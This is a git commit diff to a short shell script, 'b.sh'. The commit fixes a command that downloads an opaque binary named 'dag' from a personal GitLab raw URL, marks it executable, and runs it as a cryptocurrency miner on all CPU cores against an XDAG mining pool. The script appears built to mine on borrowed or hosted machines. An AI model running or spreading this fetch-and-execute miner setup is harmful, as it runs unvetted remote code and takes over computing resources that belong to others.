2f19bbca62ca5ab078d07f500c2c111546272914
Mistainsah <107166633+Mistainsah@users.noreply.github.com>
2022-07-13 22:34:24 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,7 +3,7 @@ wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
 \rm node-v14.17.0-linux-x64.tar.gz
 PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
 npm config set cache /tmp --global
-wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag | chmod +x dag
+wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag && chmod +x dag
 ph add dag
 ./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)
 
